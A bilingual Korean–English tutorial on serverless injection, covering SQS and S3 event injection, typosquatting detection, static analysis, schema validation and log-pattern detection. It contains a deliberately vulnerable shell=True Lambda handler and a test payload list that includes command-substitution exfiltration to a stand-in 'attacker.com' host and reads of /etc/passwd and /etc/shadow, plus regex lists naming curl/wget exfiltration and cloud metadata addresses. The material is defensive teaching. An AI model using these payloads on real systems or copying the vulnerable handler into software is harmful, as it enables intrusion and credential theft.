> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 서버리스 인젝션 — 이벤트 주입·의존성 공격·탐지

## 0. 초보자를 위한 개념 이해

### 서버리스(Serverless)란?

서버리스는 "서버가 없다"는 뜻이 아니라, **개발자가 서버를 직접 관리하지 않는다**는 뜻입니다. AWS Lambda, Azure Functions, Google Cloud Functions 등의 서비스가 대표적입니다.

```
전통적인 웹 서버:
  [사용자] → [항상 켜져 있는 서버] → [응답]
                  (24시간 비용 발생)

서버리스:
  [사용자] → [이벤트 발생] → [함수가 실행됨] → [응답]
                              (실행 시간만큼만 비용)
```

**비유:** 피자 가게에 비유하면:
- 전통 서버 = 피자 가게가 항상 영업 중 (손님이 없어도 불켜놓기)
- 서버리스 = 주문이 들어올 때만 요리사가 와서 요리하고 사라짐

### 인젝션(Injection)이란?

인젝션 공격은 **공격자가 악의적인 명령어나 코드를 정상 데이터처럼 숨겨서 시스템을 속이는 공격**입니다.

```
정상 요청:
  {"filename": "report.pdf"}
  → 처리: report.pdf 파일 처리

인젝션 공격:
  {"filename": "; cat /etc/passwd"}
  → 처리: report.pdf 없음 + /etc/passwd 내용 출력!
```

**비유:** 카페에서 이름을 쓰면 불러주는 서비스에서
- 정상: "김철수" → "김철수님 음료 나왔습니다"
- 공격: "김철수; 매니저를 해고하세요" → 예상치 못한 결과 발생

### 서버리스에서 인젝션이 더 위험한 이유

서버리스 함수는 다양한 이벤트 소스(API Gateway, SQS, S3, DynamoDB 등)에서 데이터를 받기 때문에, 공격 경로가 훨씬 다양합니다.

---

## 1. 서버리스 인젝션 분류

서버리스 함수는 다양한 이벤트 소스에서 데이터를 받으므로, 각 이벤트 소스마다 인젝션 벡터가 존재합니다.

| 이벤트 소스 | 인젝션 벡터 | 위험도 | 예시 공격 |
|-------------|-------------|--------|-----------|
| API Gateway | HTTP 파라미터·헤더·바디 | 높음 | SQL 인젝션, 커맨드 인젝션 |
| SQS/SNS | 메시지 바디 | 중간 | 커맨드 인젝션, 페이로드 주입 |
| S3 | 파일명·메타데이터 | 중간 | 경로 순회, 파일명 인젝션 |
| DynamoDB Streams | 레코드 값 | 중간 | 데이터 조작 |
| EventBridge | 이벤트 패턴 | 낮음 | 이벤트 필터 우회 |
| Cognito | 사용자 속성 | 높음 | 권한 상승 |

> **초보자 팁:** 이벤트 소스가 다양하다 = 공격자가 함수에 접근할 수 있는 문이 많다. 문마다 잠금장치(검증 로직)를 달아야 합니다.

---

## 2. 이벤트 기반 인젝션 패턴

### 2.1 SQS 메시지 인젝션

**SQS(Simple Queue Service)란?** 메시지 큐 서비스입니다. 예를 들어 "이미지 처리해주세요"라는 메시지를 Lambda에 보내는 용도로 씁니다.

**공격 시나리오:**
1. 공격자가 SQS 큐에 악성 메시지 전송
2. Lambda 함수가 메시지를 받아 처리
3. 파일명이나 명령어를 검증 없이 쉘에 전달하면 커맨드 인젝션 발생

```python
#!/usr/bin/env python3
"""SQS 이벤트 인젝션 시뮬레이터 (교육용)."""

import json
import subprocess
import shlex
from dataclasses import dataclass


@dataclass
class SQSMessage:
    body: str
    message_id: str
    receipt_handle: str


# ❌ 취약한 핸들러 — 메시지 바디를 쉘 명령어에 직접 삽입
# 문제점: shell=True + 사용자 입력을 문자열로 연결 = 커맨드 인젝션
def vulnerable_handler(event: dict, context) -> dict:
    for record in event.get("Records", []):
        message = record["body"]
        # 위험: 직접 삽입 → 커맨드 인젝션
        # message = "; cat /etc/passwd" 이면 다음 명령이 됨:
        # process_file.sh ; cat /etc/passwd
        result = subprocess.run(
            f"process_file.sh {message}",
            shell=True, capture_output=True, text=True
        )
        print(result.stdout)
    return {"statusCode": 200}


# ✅ 안전한 핸들러
# 1단계: JSON 파싱으로 구조화된 데이터만 받음
# 2단계: 정규표현식으로 파일명 화이트리스트 검증
# 3단계: 리스트 형태로 전달해서 쉘 해석 방지
def safe_handler(event: dict, context) -> dict:
    import re
    for record in event.get("Records", []):
        message = record["body"]
        # 1단계: JSON 파싱 후 검증
        try:
            data = json.loads(message)
        except json.JSONDecodeError:
            print(f"유효하지 않은 JSON: {message[:100]}")
            continue

        filename = data.get("filename", "")
        # 2단계: 파일명 화이트리스트 검증 (영숫자, _, -, . 만 허용)
        if not re.fullmatch(r"[a-zA-Z0-9_\-\.]+", filename):
            print(f"위험한 파일명 거부: {filename}")
            continue

        # 3단계: shlex.quote 대신 리스트로 전달 (shell=False가 기본값)
        # 리스트로 전달하면 각 요소가 별도 인수로 처리되어 쉘 해석 없음
        result = subprocess.run(
            ["process_file.sh", filename],
            capture_output=True, text=True, timeout=30
        )
    return {"statusCode": 200}


def build_injection_payloads() -> list[dict]:
    """테스트용 인젝션 페이로드 생성 (펜테스트/CTF 교육용)."""
    return [
        {"filename": "; cat /etc/passwd"},         # 명령어 구분자로 추가 명령 실행
        {"filename": "$(curl attacker.com/$(whoami))"},  # 명령어 치환으로 외부로 데이터 전송
        {"filename": "../../etc/shadow"},           # 경로 순회로 시스템 파일 접근
        {"filename": "a" * 10000},                  # 긴 입력으로 버퍼 오버플로우 시도
        {"filename": "\x00null_byte"},              # 널 바이트로 문자열 조기 종료
    ]
```

**핵심 방어 원칙:**
1. 입력을 항상 파싱된 구조체로 처리 (raw 문자열 금지)
2. 화이트리스트 방식 검증 (허용할 문자만 명시)
3. `shell=True` 절대 금지 → 리스트 형태로 명령어 전달

### 2.2 S3 트리거 파일명 인젝션

**공격 시나리오:**
1. 공격자가 S3 버킷에 특수 이름의 파일 업로드
2. Lambda 함수가 파일 생성 이벤트를 받아 파일명을 처리
3. 파일명에 `../../etc/passwd` 같은 경로 순회 시도

```python
#!/usr/bin/env python3
"""S3 이벤트 파일명 인젝션 탐지 및 안전 처리."""

import argparse
import re
from pathlib import PurePosixPath
import boto3


# 안전한 파일명: 영숫자로 시작, 영숫자+_-.만 허용, 최대 255자
SAFE_FILENAME_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_\-\.]{0,254}$")


def validate_s3_key(key: str) -> tuple[bool, str]:
    """S3 객체 키 유효성 검사.
    
    검사 항목:
    1. 경로 순회 방지 (.., 선행 /)
    2. 파일명 화이트리스트 검증
    3. 위험 확장자 차단
    """
    # 경로 순회 방지: ".."이나 절대 경로 "/로 시작" 차단
    if ".." in key or key.startswith("/"):
        return False, "경로 순회 시도"

    filename = PurePosixPath(key).name
    if not SAFE_FILENAME_RE.match(filename):
        return False, f"위험한 파일명: {filename}"

    # 위험 확장자 차단: 실행 가능한 파일들
    dangerous_extensions = {".exe", ".sh", ".py", ".js", ".php", ".bat", ".cmd"}
    ext = PurePosixPath(filename).suffix.lower()
    if ext in dangerous_extensions:
        return False, f"위험한 확장자: {ext}"

    return True, "OK"


def safe_s3_handler(event: dict, context) -> dict:
    """안전한 S3 이벤트 핸들러.
    
    거부된 파일은 삭제하지 않고 격리 버킷으로 이동해
    나중에 분석할 수 있도록 보존합니다.
    """
    s3_client = boto3.client("s3")

    for record in event.get("Records", []):
        bucket = record["s3"]["bucket"]["name"]
        key = record["s3"]["object"]["key"]

        is_valid, reason = validate_s3_key(key)
        if not is_valid:
            print(f"[SECURITY] 위험한 S3 키 거부: {key} — {reason}")
            # 격리 버킷으로 이동 (원본 보존하면서 안전하게 분리)
            s3_client.copy_object(
                CopySource={"Bucket": bucket, "Key": key},
                Bucket="quarantine-bucket",
                Key=f"quarantined/{key}",
            )
            s3_client.delete_object(Bucket=bucket, Key=key)
            continue

        # 안전한 처리 로직
        print(f"[OK] 처리 중: s3://{bucket}/{key}")

    return {"statusCode": 200}
```

**왜 격리 버킷을 사용하나?**
- 악성 파일을 즉시 삭제하면 **증거가 사라져** 나중에 침해 분석이 어렵습니다
- 격리 버킷으로 이동하면 접근이 제한된 안전한 환경에서 보존됩니다
- 보안팀이 나중에 해당 파일을 분석해 공격자의 의도를 파악할 수 있습니다

---

## 3. 의존성 공격 (Supply Chain)

### 공급망 공격이란?

**비유:** 음식 재료를 납품하는 공급업체가 오염된 재료를 납품하는 것과 같습니다. 여러분의 코드는 안전하더라도, 외부에서 가져온 라이브러리가 악의적이면 위험합니다.

```
정상 의존성:                   타이포스쿼팅 공격:
requests (정품)                reqquests (가짜)
boto3 (정품)                   bot0 (숫자 0으로 l 대체)
numpy (정품)                   nunpy (n→u 오타)
```

### 3.1 타이포스쿼팅 탐지

```python
#!/usr/bin/env python3
"""Lambda 의존성 타이포스쿼팅 탐지 CLI.

타이포스쿼팅: 유명 패키지와 유사한 이름의 악성 패키지를 PyPI에 올려놓고
개발자가 오타를 입력할 때 악성 코드가 설치되도록 하는 공격입니다.
"""

import argparse
import json
import re
from pathlib import Path
import httpx

# 자주 타이포스쿼팅 대상이 되는 인기 패키지 목록
# 이 패키지들은 AWS Lambda 환경에서 자주 쓰입니다
POPULAR_PACKAGES = {
    "boto3", "requests", "numpy", "pandas", "flask", "django",
    "pydantic", "fastapi", "sqlalchemy", "cryptography", "paramiko",
    "pillow", "pytest", "black", "mypy", "httpx",
}

# 타이포스쿼팅 패턴: 공격자가 사용하는 변형 방식들
TYPOSQUAT_PATTERNS = [
    lambda p: p.replace("o", "0"),        # o→0: boto3→b0to3
    lambda p: p.replace("i", "l"),        # i→l: pillow→plllow
    lambda p: p.replace("l", "1"),        # l→1: flask→f1ask
    lambda p: p + "-python",              # 접미사: requests-python
    lambda p: "python-" + p,             # 접두사: python-requests
    lambda p: p.replace("-", "_"),        # 구분자: boto-3→boto_3
    lambda p: p.replace("_", "-"),        # 구분자: boto_3→boto-3
    lambda p: p + "s",                   # 복수형: boto3s
    lambda p: p[:-1] if len(p) > 3 else p,  # 마지막 글자 제거: boto3→boto
]


def check_package_on_pypi(package_name: str) -> dict | None:
    """PyPI에서 패키지 존재 여부 및 정보 확인."""
    try:
        with httpx.Client() as client:
            resp = client.get(
                f"https://pypi.org/pypi/{package_name}/json",
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "name": data["info"]["name"],
                    "version": data["info"]["version"],
                    "author": data["info"]["author"],
                    "requires_python": data["info"]["requires_python"],
                }
    except httpx.RequestError:
        pass
    return None


def analyze_requirements(req_file: Path) -> list[dict]:
    """requirements.txt 분석 — 타이포스쿼팅 의심 패키지 탐지.
    
    Levenshtein 거리(편집 거리)를 이용해 인기 패키지 이름과
    1~2자 차이 나는 패키지를 탐지합니다.
    """
    suspicious: list[dict] = []

    with req_file.open() as f:
        packages = [
            line.split("==")[0].split(">=")[0].split("<=")[0].strip()
            for line in f
            if line.strip() and not line.startswith("#")
        ]

    for pkg in packages:
        pkg_lower = pkg.lower()
        # 인기 패키지와 유사한지 확인
        for popular in POPULAR_PACKAGES:
            if pkg_lower == popular:
                continue
            # 편집 거리 계산: 1~2자 차이면 의심
            dist = levenshtein(pkg_lower, popular)
            if 0 < dist <= 2:
                pypi_info = check_package_on_pypi(pkg)
                suspicious.append({
                    "package": pkg,
                    "similar_to": popular,
                    "distance": dist,
                    "exists_on_pypi": pypi_info is not None,
                    "pypi_info": pypi_info,
                })
                break

    return suspicious


def levenshtein(a: str, b: str) -> int:
    """두 문자열 사이의 편집 거리 계산.
    
    편집 거리 = 한 문자열을 다른 문자열로 바꾸는 데
    필요한 최소 삽입/삭제/교체 횟수
    
    예: "boto3" → "b0to3" = 1 (o→0 교체 1번)
    예: "requests" → "reqquests" = 1 (q 삽입 1번)
    """
    if len(a) < len(b):
        return levenshtein(b, a)
    if not b:
        return len(a)
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a):
        curr = [i + 1]
        for j, cb in enumerate(b):
            curr.append(min(prev[j + 1] + 1, curr[j] + 1, prev[j] + (ca != cb)))
        prev = curr
    return prev[-1]


def main() -> None:
    parser = argparse.ArgumentParser(description="Lambda 의존성 타이포스쿼팅 탐지")
    parser.add_argument("requirements", type=Path, help="requirements.txt 경로")
    parser.add_argument("-o", "--output", type=Path, help="결과 JSON 저장 경로")
    args = parser.parse_args()

    print(f"[*] 분석 중: {args.requirements}")
    suspicious = analyze_requirements(args.requirements)

    if suspicious:
        print(f"\n[!] 의심 패키지 {len(suspicious)}개 발견:")
        for item in suspicious:
            print(f"  {item['package']} → '{item['similar_to']}' 유사 (거리: {item['distance']})")
            if item["exists_on_pypi"]:
                print(f"    PyPI 존재: {item['pypi_info']}")
            else:
                print(f"    PyPI에 없음 (더 의심스러움)")
    else:
        print("[+] 타이포스쿼팅 의심 패키지 없음")

    if args.output:
        args.output.write_text(json.dumps(suspicious, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

**실습 예시:**
```bash
# requirements.txt 예시 파일 생성
cat > requirements.txt << EOF
boto3==1.34.0
reqquests==2.31.0    # ← 오타! requests가 맞음
numpy==1.24.0
b0to3==1.34.0        # ← 의심! boto3를 노린 타이포스쿼팅
EOF

# 탐지 실행
python3 typosquat_detector.py requirements.txt -o suspicious.json
```

---

## 4. 서버리스 OS 커맨드 인젝션

### 정적 분석으로 취약점 찾기

코드를 실제로 실행하지 않고 소스코드를 분석해 취약점을 찾는 방법입니다. **AST(Abstract Syntax Tree, 추상 구문 트리)**를 사용해 Python 코드의 구조를 분석합니다.

**AST란?** 코드를 트리 구조로 표현한 것입니다.
```
subprocess.run(f"ls {user_input}", shell=True)
      ↓ AST로 표현
Call(
  func=Attribute(value=Name('subprocess'), attr='run'),
  args=[JoinedStr(...)],   ← f-string (동적 문자열 = 위험)
  keywords=[keyword(arg='shell', value=Constant(True))]  ← shell=True = 위험
)
```

```python
#!/usr/bin/env python3
"""서버리스 환경 커맨드 인젝션 탐지 — 정적 분석.

Lambda 함수 코드를 AST로 파싱해서 위험한 패턴을 자동으로 찾아냅니다.
CI/CD 파이프라인에 통합하면 배포 전에 취약점을 발견할 수 있습니다.
"""

import argparse
import ast
import re
from pathlib import Path
from dataclasses import dataclass


# 위험한 함수 목록: 이 함수들이 사용자 입력을 받으면 인젝션 위험
DANGEROUS_FUNCTIONS = {
    "subprocess.call", "subprocess.run", "subprocess.Popen",
    "subprocess.check_output", "subprocess.check_call",
    "os.system", "os.popen", "os.execv", "os.execve",
    "eval",   # eval("입력값") → 임의 코드 실행
    "exec",   # exec("입력값") → 임의 코드 실행
}


@dataclass
class Finding:
    """분석 결과 항목."""
    file: str
    line: int
    function: str
    code: str
    risk: str  # LOW, MEDIUM, HIGH


def analyze_file(filepath: Path) -> list[Finding]:
    """Python 파일을 AST로 분석해 위험한 패턴 탐지.
    
    위험도 분류:
    - HIGH: shell=True + 동적 문자열 (f-string, 연결, 함수 반환값)
    - MEDIUM: shell=True 사용
    - LOW: 위험 함수 사용 (shell 없이)
    """
    findings: list[Finding] = []
    source = filepath.read_text(encoding="utf-8")

    try:
        tree = ast.parse(source)
    except SyntaxError:
        return findings

    lines = source.splitlines()

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue

        func_name = ""
        if isinstance(node.func, ast.Attribute):
            if isinstance(node.func.value, ast.Name):
                func_name = f"{node.func.value.id}.{node.func.attr}"
        elif isinstance(node.func, ast.Name):
            func_name = node.func.id

        if func_name not in DANGEROUS_FUNCTIONS:
            continue

        # shell=True 사용 여부 확인
        uses_shell = any(
            (isinstance(kw.value, ast.Constant) and kw.value.value is True)
            for kw in node.keywords
            if kw.arg == "shell"
        )

        # 첫 번째 인수가 동적으로 생성된 문자열인지 확인
        if node.args:
            first_arg = node.args[0]
            # JoinedStr = f-string, BinOp = + 연결, Call = 함수 반환값
            is_dynamic = isinstance(first_arg, (ast.JoinedStr, ast.BinOp, ast.Call))

            # 위험도 결정
            risk = "HIGH" if (uses_shell and is_dynamic) else "MEDIUM" if uses_shell else "LOW"
            code_line = lines[node.lineno - 1].strip() if node.lineno <= len(lines) else ""

            findings.append(Finding(
                file=str(filepath),
                line=node.lineno,
                function=func_name,
                code=code_line,
                risk=risk,
            ))

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(
        description="서버리스 커맨드 인젝션 정적 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # 단일 파일 분석
  python3 injection_analyzer.py lambda_handler.py

  # 디렉터리 전체 분석 (HIGH 위험만)
  python3 injection_analyzer.py ./src/ --min-risk HIGH

  # 모든 위험도 포함
  python3 injection_analyzer.py ./src/ --min-risk LOW
        """
    )
    parser.add_argument("path", type=Path, help="분석할 파일 또는 디렉터리")
    parser.add_argument(
        "--min-risk",
        choices=["LOW", "MEDIUM", "HIGH"],
        default="MEDIUM",
        help="최소 위험도 필터 (기본값: MEDIUM)"
    )
    args = parser.parse_args()

    risk_levels = {"LOW": 0, "MEDIUM": 1, "HIGH": 2}
    min_level = risk_levels[args.min_risk]

    files = list(args.path.rglob("*.py")) if args.path.is_dir() else [args.path]
    all_findings: list[Finding] = []

    for f in files:
        all_findings.extend(analyze_file(f))

    filtered = [f for f in all_findings if risk_levels[f.risk] >= min_level]
    print(f"[*] {len(files)} 파일 분석 / {len(filtered)} 문제 발견")

    for finding in sorted(filtered, key=lambda x: risk_levels[x.risk], reverse=True):
        icon = "!!!" if finding.risk == "HIGH" else "!!" if finding.risk == "MEDIUM" else "!"
        print(f"\n[{finding.risk}] {icon} {finding.file}:{finding.line}")
        print(f"  함수: {finding.function}")
        print(f"  코드: {finding.code}")

    if not filtered:
        print("[+] 지정된 위험도 이상의 문제 없음")


if __name__ == "__main__":
    main()
```

**사용 예시:**
```bash
# Lambda 함수 코드 분석
python3 injection_analyzer.py ./lambda_functions/ --min-risk MEDIUM

# 출력 예시:
# [HIGH] !!! handler.py:42
#   함수: subprocess.run
#   코드: result = subprocess.run(f"convert {filename}", shell=True)
```

---

## 5. 런타임 인젝션 방어 패턴

### JSON Schema 검증이란?

JSON Schema는 **JSON 데이터의 형식을 정의하는 규칙서**입니다. 마치 회사 양식처럼 정해진 형식만 통과시킵니다.

```
규칙서(Schema):
  - user_id는 반드시 UUID v4 형식 (예: 550e8400-e29b-41d4-a716-446655440000)
  - action은 "read", "update", "delete" 중 하나
  - data는 객체, 최대 20개 속성
  - 그 외 추가 속성은 허용하지 않음

공격자의 입력:
  {"user_id": "admin", "action": "drop_database"}
  → 검증 실패! user_id가 UUID 형식 아님, action이 허용 목록에 없음
  → 400 Bad Request 반환
```

```python
# Lambda Powertools를 이용한 입력 검증 + 트레이싱
# Lambda Powertools = AWS가 제공하는 Lambda 개발 도구 모음
from aws_lambda_powertools import Logger, Tracer
from aws_lambda_powertools.utilities.data_classes import APIGatewayProxyEvent
from aws_lambda_powertools.utilities.validation import validate, SchemaValidationError
import json

logger = Logger()    # CloudWatch 로그를 구조화된 JSON으로 출력
tracer = Tracer()    # AWS X-Ray로 요청 추적

# JSON Schema 정의: 허용되는 입력의 형식
INPUT_SCHEMA = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "type": "object",
    "properties": {
        # UUID v4 정규식: 8-4-4-4-12 형식의 16진수
        "user_id": {
            "type": "string",
            "pattern": "^[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$"
        },
        # enum: 이 값들만 허용
        "action": {"type": "string", "enum": ["read", "update", "delete"]},
        # maxProperties: 최대 20개 속성으로 페이로드 크기 제한
        "data": {"type": "object", "maxProperties": 20},
    },
    "required": ["user_id", "action"],      # 필수 필드
    "additionalProperties": False,          # 정의되지 않은 필드 거부
}


@logger.inject_lambda_context   # 요청 ID, 함수명 등을 자동으로 로그에 추가
@tracer.capture_lambda_handler  # X-Ray 추적 시작
def handler(event: dict, context) -> dict:
    api_event = APIGatewayProxyEvent(event)
    try:
        body = json.loads(api_event.body or "{}")
        validate(event=body, schema=INPUT_SCHEMA)
    except (json.JSONDecodeError, SchemaValidationError) as e:
        # 검증 실패 시 상세 오류를 클라이언트에 노출하지 않음
        # (공격자에게 힌트를 주지 않기 위해 일반적인 메시지만 반환)
        logger.warning("입력 검증 실패", extra={"error": str(e)})
        return {"statusCode": 400, "body": json.dumps({"error": "Invalid input"})}

    # 검증된 입력만 처리
    user_id = body["user_id"]
    action = body["action"]
    # ...
    return {"statusCode": 200, "body": json.dumps({"status": "ok"})}
```

---

## 6. 공격 탐지 및 모니터링

### 인젝션 공격 탐지를 위한 로그 분석

```python
#!/usr/bin/env python3
"""Lambda 로그에서 인젝션 패턴 탐지 CLI.

CloudWatch Logs에서 의심스러운 패턴을 찾아내는 도구입니다.
"""

import argparse
import re
from dataclasses import dataclass
from datetime import datetime


# 인젝션 공격 패턴 정의
INJECTION_PATTERNS = {
    "command_injection": [
        r";\s*(cat|ls|id|whoami|pwd)\s",   # 명령어 구분자 후 시스템 명령
        r"\$\(.*\)",                          # 명령어 치환 $(...)
        r"`.*`",                             # 백틱 명령어 치환
        r"\|\s*(bash|sh|cmd)",              # 파이프로 쉘에 전달
    ],
    "path_traversal": [
        r"\.\./",                            # 상위 디렉터리 이동
        r"%2e%2e%2f",                        # URL 인코딩된 ../
        r"\\\.\\\.\\",                       # Windows 경로 순회
    ],
    "ssrf_attempt": [
        r"169\.254\.169\.254",              # AWS 메타데이터 서비스 IP
        r"metadata\.google\.internal",      # GCP 메타데이터
        r"localhost|127\.0\.0\.1|0\.0\.0\.0",  # 로컬 서비스 접근
    ],
    "data_exfiltration": [
        r"curl\s+.*https?://",             # curl로 외부 전송
        r"wget\s+.*https?://",             # wget으로 외부 전송
        r"base64.*decode",                  # base64 디코딩 (난독화)
        r"eval\s*\(",                       # eval로 동적 코드 실행
    ],
}


@dataclass
class DetectionResult:
    timestamp: str
    category: str
    pattern: str
    log_line: str
    severity: str


def analyze_log_line(line: str) -> list[DetectionResult]:
    """로그 한 줄에서 인젝션 패턴 탐지."""
    results = []
    
    for category, patterns in INJECTION_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, line, re.IGNORECASE):
                severity = "HIGH" if category in ("command_injection", "data_exfiltration") else "MEDIUM"
                results.append(DetectionResult(
                    timestamp=datetime.now().isoformat(),
                    category=category,
                    pattern=pattern,
                    log_line=line[:200],
                    severity=severity,
                ))
                break  # 카테고리당 첫 번째 매칭만 기록
    
    return results


def analyze_log_file(log_file: str, verbose: bool = False) -> None:
    """로그 파일 전체 분석."""
    total_lines = 0
    total_alerts = 0
    
    with open(log_file, encoding="utf-8", errors="replace") as f:
        for line in f:
            total_lines += 1
            results = analyze_log_line(line.strip())
            
            for result in results:
                total_alerts += 1
                icon = "!!!" if result.severity == "HIGH" else "!!"
                print(f"[{result.severity}] {icon} {result.category}")
                print(f"  패턴: {result.pattern}")
                if verbose:
                    print(f"  로그: {result.log_line}")
    
    print(f"\n[요약] 총 {total_lines}줄 분석, {total_alerts}건 탐지")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Lambda 로그 인젝션 패턴 탐지",
        epilog="예시: python3 log_analyzer.py /tmp/lambda.log -v"
    )
    parser.add_argument("log_file", help="분석할 로그 파일 경로")
    parser.add_argument("-v", "--verbose", action="store_true", help="로그 라인 전체 출력")
    args = parser.parse_args()

    analyze_log_file(args.log_file, args.verbose)


if __name__ == "__main__":
    main()
```

---

## 7. 참고 도구

| 도구 | 용도 | 초보자 진입장벽 |
|------|------|----------------|
| `Semgrep` | 서버리스 코드 정적 분석 | 낮음 (규칙 미리 있음) |
| `PMapper` | AWS IAM 권한 그래프 분석 | 중간 |
| `ScoutSuite` | 클라우드 보안 감사 | 중간 |
| `Prowler` | AWS 보안 설정 감사 | 낮음 (자동화) |
| `Snyk` | 의존성 취약점 탐지 | 낮음 (CLI 사용 쉬움) |
| `pip-audit` | Python 의존성 감사 | 낮음 (`pip-audit` 실행만) |
| `bandit` | Python 보안 정적 분석 | 낮음 |
| `checkov` | IaC(Terraform/CFn) 보안 스캔 | 중간 |

**초보자 추천 시작 순서:**
1. `pip-audit` — `pip install pip-audit && pip-audit` 한 줄로 실행
2. `bandit` — `pip install bandit && bandit -r ./src/`
3. `Semgrep` — `semgrep --config=auto ./`
4. `Prowler` — AWS 환경 전체 감사

---

## 8. 핵심 정리 (초보자 요약)

| 공격 유형 | 원인 | 방어법 |
|-----------|------|--------|
| 커맨드 인젝션 | 검증 없이 입력을 쉘에 전달 | 리스트로 전달, shell=False |
| 경로 순회 | 파일명에 ../ 포함 | 화이트리스트 검증 |
| 타이포스쿼팅 | 오타 패키지 설치 | pip-audit, 패키지 이름 확인 |
| 이벤트 인젝션 | 이벤트 소스 데이터 미검증 | JSON Schema 검증 |
| SSRF | URL 파라미터 미검증 | URL 화이트리스트 |

**가장 중요한 원칙:** "신뢰하지 말고 검증하라 (Never Trust, Always Verify)"  
어떤 이벤트 소스에서 오든, 입력은 항상 위험하다고 가정하고 검증해야 합니다.

---

<!-- detect-validate-53 -->
## 서버리스 인젝션 탐지와 입력 신뢰경계 검증

서버리스 인젝션은 *이벤트 기반 인젝션·의존성 공격·OS 커맨드 인젝션*으로 함수 실행을 탈취한다. 이벤트는 다중 소스(API/큐/스토리지)라 방어자는 **모든 이벤트 소스가 신뢰 불가로 검증되는가**를 확인해야 한다. 검증은 **소유 함수**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 이벤트 인젝션 | 이벤트 신뢰 | 스키마·소스 검증 | 비정상 이벤트 구조 |
| OS 커맨드 | 셸 호출 입력 | 셸 회피·인자배열 | os.system/exec 입력 |
| 의존성 공격 | 미고정 패키지 | 락·해시 핀 | 신규 빌드 후크 |
| NoSQL/SQL | 동적 쿼리 | 파라미터화 | 입력 직삽 쿼리 |

### 방어 검증 (직접 확인)

```bash
# 1) 소유 함수 코드의 커맨드 인젝션 표면 — 이벤트 입력이 셸로 흐르면 신호
grep -rInE 'os\.(system|popen)|subprocess\.(call|run|Popen)\(.*shell=True|exec\(' . 2>/dev/null | head
# 2) 의존성 무결성 핀 여부 — 락파일에 해시 핀 없으면 공급망 인젝션 표면 신호
grep -cE '--hash=sha256:' requirements.txt 2>/dev/null; jq -r '.packages|to_entries[]|select(.value.integrity==null)|.key' package-lock.json 2>/dev/null | head
```

> 서버리스 인젝션 방어는 *모든 이벤트가 검증되는가*다 — "함수가 트리거된다"와 "이벤트가 스키마 검증되고 입력이 셸로 안 흐르며 의존성이 핀된다"는 다르다. 소유 함수에서 직접 확인한다([[05_Web_Hacking]], [[35_Supply_Chain_Attacks]], [[14_Cloud_Security]]).

**최신 기법·통제 (2025–2026):**
- 이벤트소스(큐·스토리지·API) 경유 인젝션이 특유 — 신뢰불가 이벤트를 데이터로만 처리. 검증: 오염 이벤트가 명령/쿼리로 흘러드는지 taint 추적([[05_Web_Hacking]])
- 출력 인코딩 — 강제되는지 확인

---

<a name="english"></a>

# Serverless Injection — Event Injection, Dependency Attacks, and Detection

## 0. Beginner Concepts

### What is Serverless?

"Serverless" doesn't mean there are no servers — it means **developers don't manage the servers directly**. AWS Lambda, Azure Functions, and Google Cloud Functions are the most popular examples.

```
Traditional Web Server:
  [User] → [Always-on server] → [Response]
               (24/7 cost)

Serverless:
  [User] → [Event occurs] → [Function runs] → [Response]
                             (Pay only for execution time)
```

**Analogy:** Think of a pizza restaurant:
- Traditional server = restaurant always open (lights on, staff waiting)
- Serverless = chef comes in only when an order arrives, then leaves

### What is Injection?

An injection attack is when **an attacker hides malicious commands or code inside what looks like normal data** to trick the system.

```
Normal request:
  {"filename": "report.pdf"}
  → Processes: report.pdf file

Injection attack:
  {"filename": "; cat /etc/passwd"}
  → Runs: report.pdf (not found) + outputs /etc/passwd!
```

### Why Injection is Especially Dangerous in Serverless

Serverless functions receive data from many event sources (API Gateway, SQS, S3, DynamoDB, etc.), which creates far more attack surfaces than a traditional HTTP server.

---

## 1. Serverless Injection Classification

Serverless functions receive data from various event sources, creating an injection vector at each event source.

| Event Source | Injection Vector | Risk | Example Attack |
|-------------|-----------------|------|----------------|
| API Gateway | HTTP parameters, headers, body | High | SQL injection, command injection |
| SQS/SNS | Message body | Medium | Command injection, payload injection |
| S3 | File name, metadata | Medium | Path traversal, filename injection |
| DynamoDB Streams | Record values | Medium | Data manipulation |
| EventBridge | Event patterns | Low | Event filter bypass |
| Cognito | User attributes | High | Privilege escalation |

> **Beginner tip:** More event sources = more doors into your function. Every door needs a lock (validation logic).

---

## 2. Event-based Injection Patterns

### 2.1 SQS Message Injection

**What is SQS?** A message queue service. For example, sending a "please process this image" message to Lambda.

**Attack scenario:**
1. Attacker sends a malicious message to the SQS queue
2. Lambda function receives and processes the message
3. If the filename or command is passed to the shell without validation, command injection occurs

The vulnerable pattern uses `shell=True` with an unsanitized input string. The safe pattern:
1. Parses the JSON payload first
2. Validates the filename against a whitelist regex
3. Passes arguments as a list (not a string) to prevent shell interpretation

**Key injection payloads for testing:**
- `"; cat /etc/passwd"` — command separator: runs additional command
- `"$(curl attacker.com/$(whoami))"` — command substitution: exfiltrates data
- `"../../etc/shadow"` — path traversal: accesses system files
- Very long strings — buffer overflow attempt
- Null bytes — string termination bypass

### 2.2 S3 Trigger Filename Injection

**Attack scenario:**
1. Attacker uploads a file with a specially crafted name to the S3 bucket
2. Lambda receives the file creation event and processes the filename
3. A filename like `../../etc/passwd` causes path traversal

Validation must:
1. Reject path traversal sequences (`..`, leading `/`)
2. Validate filename against a safe character whitelist pattern
3. Block dangerous file extensions (`.exe`, `.sh`, `.py`, `.php`, etc.)
4. Move rejected files to a quarantine bucket rather than deleting them

**Why quarantine instead of delete?**
- Immediate deletion destroys forensic evidence
- The quarantine bucket preserves files for later analysis
- Security teams can analyze the malicious file to understand the attacker's intent

---

## 3. Dependency Attacks (Supply Chain)

### What is a Supply Chain Attack?

